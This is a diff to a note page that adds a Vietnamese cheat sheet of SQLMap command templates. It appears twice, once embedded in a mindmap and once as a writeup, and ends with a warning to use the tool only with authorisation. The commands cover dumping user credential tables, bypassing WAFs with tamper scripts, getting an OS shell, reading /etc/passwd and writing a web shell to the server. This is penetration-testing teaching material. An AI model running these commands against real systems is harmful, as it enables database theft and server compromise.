@@ -6,10 +6,10 @@ tags:
 ---
 
 
-<div class="excalidraw-container" id="ex-fd7l78">
+<div class="excalidraw-container" id="ex-dykf21">
   <div class="excalidraw-toolbar">
     <div class="excalidraw-badge">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 19l7-7 3 3-7 7-3-3z"></path><path d="M18 13l-1.5-7.5L2 2l3.5 14.5L13 18l5-5z"></path><path d="M2 2l7.586 7.586"></path><circle cx="11" cy="11" r="2"></circle></svg>
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
       <span>Excalidraw Mindmap</span>
     </div>
     <div class="excalidraw-controls">
@@ -22,7 +22,179 @@ tags:
   <div class="excalidraw-viewport">
     <div class="excalidraw-canvas-wrapper">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1709 3557" class="excalidraw-svg" data-width="1709" data-height="3557">
-<a href="../tools/sql-map-template_md" class="excalidraw-node-link" target="_self" title="sql map template_md"><g transform="translate(422.95,-746.87)">
+<g transform="translate(422.95,-746.87)">
+
+<rect x="-382.9548034667969" y="962.0431518554681" width="801.4813975075078" height="3301.3400421142587" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
+<foreignObject x="-382.9548034667969" y="962.0431518554681" width="801.4813975075078" height="3301.3400421142587" class="excalidraw-foreign-md">
+  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
+    <div class="notion-embed-header">
+      <div class="notion-embed-header-left">
+        <span class="notion-embed-icon">📝</span>
+        <span class="notion-embed-title">1. SQL Injection cơ bản với tham số GET</span>
+      </div>
+      <a href="#doc-b104a7903aa064e9b1dea4c62844ea6c8d5e4fd6" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
+    </div>
+    <div class="notion-embed-body">
+      <p>Dưới đây là tổng hợp các <strong>template sử dụng SQLMap</strong> cho nhiều tình huống tấn công SQL injection phổ biến. Các lệnh được phân loại theo mục đích và dạng request, giúp bạn dễ dàng áp dụng khi pentest hợp pháp.</p>
+<hr>
+<h2>1. SQL Injection cơ bản với tham số GET</h2>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch
+</code></pre>
+<ul>
+<li><code>-u</code> : URL chứa tham số cần test.</li>
+<li><code>--batch</code> : tự động chọn các lựa chọn mặc định, không hỏi.</li>
+</ul>
+<p><strong>Thêm chỉ định DBMS nếu biết trước:</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbms=mysql --batch
+</code></pre>
+<p><strong>Tăng mức độ test (level, risk):</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --level=5 --risk=3 --batch
+</code></pre>
+<hr>
+<h2>2. POST form (dữ liệu gửi qua POST)</h2>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/login.php&quot; --data=&quot;username=admin&amp;password=pass&quot; --batch
+</code></pre>
+<ul>
+<li><code>--data</code> : chuỗi dữ liệu POST, SQLMap sẽ tự test tất cả các tham số.</li>
+</ul>
+<p><strong>Chỉ test một tham số cụ thể:</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/login.php&quot; --data=&quot;username=admin&amp;password=pass&quot; -p username --batch
+</code></pre>
+<ul>
+<li><code>-p</code> : chỉ định tham số cần test.</li>
+</ul>
+<p><strong>Dùng method POST với content-type JSON:</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/api/login&quot; --data=&#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;pass&quot;}&#39; --batch
+</code></pre>
+<hr>
+<h2>3. Kèm theo Cookie (session, xác thực)</h2>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --cookie=&quot;PHPSESSID=2kg9pgcnd306oi1v39k6ismlnt&quot; --batch
+</code></pre>
+<p><strong>Nếu có nhiều header cần thêm:</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --cookie=&quot;PHPSESSID=abc; token=xyz&quot; --batch
+</code></pre>
+<p><strong>Dùng file cookie (định dạng Netscape):</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --cookie-file=/path/to/cookies.txt --batch
+</code></pre>
+<hr>
+<h2>4. Sử dụng request từ file (Burp capture)</h2>
+<pre><code class="language-bash">sqlmap -r request.txt --batch
+</code></pre>
+<ul>
+<li><code>request.txt</code> là file chứa raw HTTP request (có thể lưu từ Burp Suite, Fiddler).</li>
+<li>SQLMap sẽ tự động parse URL, method, headers, cookie, data và test tất cả các tham số.</li>
+</ul>
+<p><strong>Chỉ test tham số cụ thể trong file:</strong></p>
+<pre><code class="language-bash">sqlmap -r request.txt -p username --batch
+</code></pre>
+<hr>
+<h2>5. Lấy dữ liệu sau khi xác nhận injection</h2>
+<p>Sau khi phát hiện lỗi, bạn có thể dùng các lệnh sau:</p>
+<h3>Lấy danh sách databases</h3>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbs --batch
+</code></pre>
+<h3>Lấy bảng của một database</h3>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname --tables --batch
+</code></pre>
+<h3>Lấy dữ liệu từ bảng</h3>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname -T users --dump --batch
+</code></pre>
+<ul>
+<li><code>--dump</code> : lấy toàn bộ dữ liệu trong bảng.</li>
+<li>Có thể thêm <code>--columns</code> để xem các cột trước.</li>
+</ul>
+<h3>Lấy dữ liệu từ một cột cụ thể</h3>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname -T users -C username,password --dump --batch
+</code></pre>
+<hr>
+<h2>6. Blind SQL Injection (time-based hoặc boolean-based)</h2>
+<p>Nếu ứng dụng không hiển thị lỗi, cần dùng kỹ thuật blind.</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --technique=B --batch
+</code></pre>
+<ul>
+<li><code>--technique</code> : chỉ định kỹ thuật (B: boolean-based blind, T: time-based, E: error-based, U: union query, S: stacked queries).</li>
+<li>Ví dụ chỉ dùng time-based:</li>
+</ul>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --technique=T --time-sec=5 --batch
+</code></pre>
+<ul>
+<li><code>--time-sec</code> : số giây delay để xác nhận time-based.</li>
+</ul>
+<hr>
+<h2>7. Bypass WAF (Web Application Firewall)</h2>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --tamper=space2comment --batch
+</code></pre>
+<ul>
+<li><code>--tamper</code> : dùng các script biến đổi payload để bypass WAF. Một số script phổ biến: <code>between</code>, <code>randomcase</code>, <code>space2comment</code>, <code>charencode</code>, <code>versionedmorekeywords</code>.</li>
+</ul>
+<p>Kết hợp nhiều tamper:</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --tamper=between,randomcase,space2comment --batch
+</code></pre>
+<p>Xem danh sách tamper có sẵn:</p>
+<pre><code class="language-bash">sqlmap --list-tampers
+</code></pre>
+<hr>
+<h2>8. Tấn công SQL injection nâng cao</h2>
+<h3>Lấy shell hệ điều hành (nếu DBMS cho phép)</h3>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --os-shell --batch
+</code></pre>
+<h3>Đọc file từ server (MySQL, PostgreSQL)</h3>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --file-read=&quot;/etc/passwd&quot; --batch
+</code></pre>
+<h3>Ghi file lên server (MySQL)</h3>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --file-write=&quot;/local/file.php&quot; --file-dest=&quot;/var/www/html/shell.php&quot; --batch
+</code></pre>
+<hr>
+<h2>9. Lưu phiên làm việc (session)</h2>
+<p>SQLMap có thể lưu lại tiến trình để dùng sau:</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch -s sqlmap_session.sqlite
+</code></pre>
+<ul>
+<li><code>-s</code> : chỉ định file lưu session (thường dùng khi tấn công dài, cần resume).</li>
+</ul>
+<p>Resume lại phiên trước:</p>
+<pre><code class="language-bash">sqlmap --resume=sqlmap_session.sqlite
+</code></pre>
+<hr>
+<h2>10. Tùy chọn hữu ích khác</h2>
+<ul>
+<li><p><strong>Ẩn thông tin không cần thiết (chỉ hiển thị kết quả quan trọng):</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch --quiet
+</code></pre>
+</li>
+<li><p><strong>Tăng tốc bằng multi-threading (cẩn thận bị chặn):</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --threads=10 --batch
+</code></pre>
+</li>
+<li><p><strong>Theo dõi request/response (debug):</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -v 3 --batch
+</code></pre>
+</li>
+<li><p><strong>Sử dụng proxy (Burp) để phân tích:</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8080&quot; --batch
+</code></pre>
+</li>
+<li><p><strong>Chỉ phát hiện, không khai thác dữ liệu:</strong></p>
+<pre><code class="language-bash">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch --banner
+</code></pre>
+</li>
+</ul>
+<hr>
+<h2>⚠️ Lưu ý pháp lý</h2>
+<ul>
+<li><strong>Chỉ sử dụng SQLMap trên các hệ thống bạn có quyền kiểm tra rõ ràng.</strong></li>
+<li>Việc tấn công hệ thống không được phép là vi phạm pháp luật và đạo đức nghề nghiệp.</li>
+<li>Trong môi trường thực tế, nên có sự đồng ý bằng văn bản của chủ sở hữu hệ thống.</li>
+</ul>
+<hr>
+<p>Hy vọng các template trên giúp bạn sử dụng SQLMap hiệu quả trong các cuộc kiểm thử bảo mật hợp pháp. Nếu cần chi tiết hơn về một tùy chọn, hãy dùng <code>sqlmap -hh</code> hoặc tham khảo tài liệu chính thức.</p>
+
+    </div>
+  </div>
+</foreignObject>
+
+</g>
+<a href="./sql-map-template_md" class="excalidraw-node-link" target="_self" title="sql map template_md"><g transform="translate(422.95,-746.87)">
 <text x="-69.58" y="806.87" font-family="Virgil, Segoe UI Emoji, cursive" font-size="20" fill="#1e1e1e" text-anchor="start"><tspan x="-69.58" dy="0">📍sql map template_md</tspan></text>
 </g></a>
 <g transform="translate(422.95,-746.87)">
@@ -220,6 +392,9 @@ tags:
 <g transform="translate(422.95,-746.87)">
 <text x="464.61" y="2716.41" font-family="Virgil, Segoe UI Emoji, cursive" font-size="16" fill="#1e1e1e" text-anchor="start"><tspan x="464.61" dy="0">-- technique</tspan></text>
 </g>
+<a href="../0-asset/pasted-image-20260829233028_686.png" class="excalidraw-node-link external" target="_blank" rel="noopener" title="Xem ảnh: Pasted Image 20260829233028_686.png"><g transform="translate(422.95,-746.87)">
+<image x="646.4655525930305" y="1229.6382581922735" width="598.8821209038628" height="435.72668457031244" href="../0-asset/pasted-image-20260829233028_686.png" preserveAspectRatio="xMidYMid meet" class="excalidraw-embedded-img"/>
+</g></a>
 <g transform="translate(422.95,-746.87)">
 <path d="M496.81 1505.31 L495.69 1504.99 L494.40 1504.74 L493.39 1504.55 L494.46 1504.93 L497.49 1505.49 L504.79 1506.55 L511.30 1507.18 L519.21 1508.06 L527.35 1508.81 L535.83 1509.31 L540.10 1509.56 L548.80 1509.87 L557.50 1509.93 L566.15 1509.74 L574.68 1509.50 L582.82 1509.12 L593.37 1508.50 L599.72 1507.93 L605.56 1507.49 L610.44 1507.06 L614.99 1506.62 L619.03 1506.06 L622.62 1505.62 L625.60 1505.24 L628.24 1504.87 L629.47 1504.74 L630.43 1504.55 L632.06 1504.37 L634.25 1503.99 L635.37 1503.80 L636.55 1503.68 L637.67 1503.55 L638.79 1503.49 L638.79 1503.49" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
@@ -245,6 +420,240 @@ tags:
     </div>
   </div>
 </div>
+
+
+---
+
+## 📖 Nội dung chi tiết bài viết (Writeup)
+
+<div id="doc-b104a7903aa064e9b1dea4c62844ea6c8d5e4fd6" class="notion-callout-card">
+
+Dưới đây là tổng hợp các **template sử dụng SQLMap** cho nhiều tình huống tấn công SQL injection phổ biến. Các lệnh được phân loại theo mục đích và dạng request, giúp bạn dễ dàng áp dụng khi pentest hợp pháp.
+
+---
+
+## 1. SQL Injection cơ bản với tham số GET
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --batch
+```
+
+- `-u` : URL chứa tham số cần test.
+- `--batch` : tự động chọn các lựa chọn mặc định, không hỏi.
+
+**Thêm chỉ định DBMS nếu biết trước:**
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --batch
+```
+
+**Tăng mức độ test (level, risk):**
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
+```
+
+---
+
+## 2. POST form (dữ liệu gửi qua POST)
+
+```bash
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass" --batch
+```
+
+- `--data` : chuỗi dữ liệu POST, SQLMap sẽ tự test tất cả các tham số.
+
+**Chỉ test một tham số cụ thể:**
+```bash
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass" -p username --batch
+```
+
+- `-p` : chỉ định tham số cần test.
+
+**Dùng method POST với content-type JSON:**
+```bash
+sqlmap -u "http://target.com/api/login" --data='{"username":"admin","password":"pass"}' --batch
+```
+
+---
+
+## 3. Kèm theo Cookie (session, xác thực)
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=2kg9pgcnd306oi1v39k6ismlnt" --batch
+```
+
+**Nếu có nhiều header cần thêm:**
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc; token=xyz" --batch
+```
+
+**Dùng file cookie (định dạng Netscape):**
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --cookie-file=/path/to/cookies.txt --batch
+```
+
+---
+
+## 4. Sử dụng request từ file (Burp capture)
+
+```bash
+sqlmap -r request.txt --batch
+```
+
+- `request.txt` là file chứa raw HTTP request (có thể lưu từ Burp Suite, Fiddler).
+- SQLMap sẽ tự động parse URL, method, headers, cookie, data và test tất cả các tham số.
+
+**Chỉ test tham số cụ thể trong file:**
+```bash
+sqlmap -r request.txt -p username --batch
+```
+
+---
+
+## 5. Lấy dữ liệu sau khi xác nhận injection
+
+Sau khi phát hiện lỗi, bạn có thể dùng các lệnh sau:
+
+### Lấy danh sách databases
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
+```
+
+### Lấy bảng của một database
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables --batch
+```
+
+### Lấy dữ liệu từ bảng
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump --batch
+```
+
+- `--dump` : lấy toàn bộ dữ liệu trong bảng.
+- Có thể thêm `--columns` để xem các cột trước.
+
+### Lấy dữ liệu từ một cột cụ thể
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users -C username,password --dump --batch
+```
+
+---
+
+## 6. Blind SQL Injection (time-based hoặc boolean-based)
+
+Nếu ứng dụng không hiển thị lỗi, cần dùng kỹ thuật blind.
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --technique=B --batch
+```
+
+- `--technique` : chỉ định kỹ thuật (B: boolean-based blind, T: time-based, E: error-based, U: union query, S: stacked queries).
+- Ví dụ chỉ dùng time-based:
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=5 --batch
+```
+
+- `--time-sec` : số giây delay để xác nhận time-based.
+
+---
+
+## 7. Bypass WAF (Web Application Firewall)
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --batch
+```
+
+- `--tamper` : dùng các script biến đổi payload để bypass WAF. Một số script phổ biến: `between`, `randomcase`, `space2comment`, `charencode`, `versionedmorekeywords`.
+
+Kết hợp nhiều tamper:
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase,space2comment --batch
+```
+
+Xem danh sách tamper có sẵn:
+```bash
+sqlmap --list-tampers
+```
+
+---
+
+## 8. Tấn công SQL injection nâng cao
+
+### Lấy shell hệ điều hành (nếu DBMS cho phép)
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
+```
+
+### Đọc file từ server (MySQL, PostgreSQL)
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch
+```
+
+### Ghi file lên server (MySQL)
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/file.php" --file-dest="/var/www/html/shell.php" --batch
+```
+
+---
+
+## 9. Lưu phiên làm việc (session)
+
+SQLMap có thể lưu lại tiến trình để dùng sau:
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --batch -s sqlmap_session.sqlite
+```
+
+- `-s` : chỉ định file lưu session (thường dùng khi tấn công dài, cần resume).
+
+Resume lại phiên trước:
+```bash
+sqlmap --resume=sqlmap_session.sqlite
+```
+
+---
+
+## 10. Tùy chọn hữu ích khác
+
+- **Ẩn thông tin không cần thiết (chỉ hiển thị kết quả quan trọng):**
+  ```bash
+  sqlmap -u "http://target.com/page.php?id=1" --batch --quiet
+  ```
+
+- **Tăng tốc bằng multi-threading (cẩn thận bị chặn):**
+  ```bash
+  sqlmap -u "http://target.com/page.php?id=1" --threads=10 --batch
+  ```
+
+- **Theo dõi request/response (debug):**
+  ```bash
+  sqlmap -u "http://target.com/page.php?id=1" -v 3 --batch
+  ```
+
+- **Sử dụng proxy (Burp) để phân tích:**
+  ```bash
+  sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --batch
+  ```
+
+- **Chỉ phát hiện, không khai thác dữ liệu:**
+  ```bash
+  sqlmap -u "http://target.com/page.php?id=1" --batch --banner
+  ```
+
+---
+
+## ⚠️ Lưu ý pháp lý
+- **Chỉ sử dụng SQLMap trên các hệ thống bạn có quyền kiểm tra rõ ràng.**
+- Việc tấn công hệ thống không được phép là vi phạm pháp luật và đạo đức nghề nghiệp.
+- Trong môi trường thực tế, nên có sự đồng ý bằng văn bản của chủ sở hữu hệ thống.
+
+---
+
+Hy vọng các template trên giúp bạn sử dụng SQLMap hiệu quả trong các cuộc kiểm thử bảo mật hợp pháp. Nếu cần chi tiết hơn về một tùy chọn, hãy dùng `sqlmap -hh` hoặc tham khảo tài liệu chính thức.
+
+</div>
+
+---
+
 
 
 ### 🔗 Các bài viết liên kết trong sơ đồ
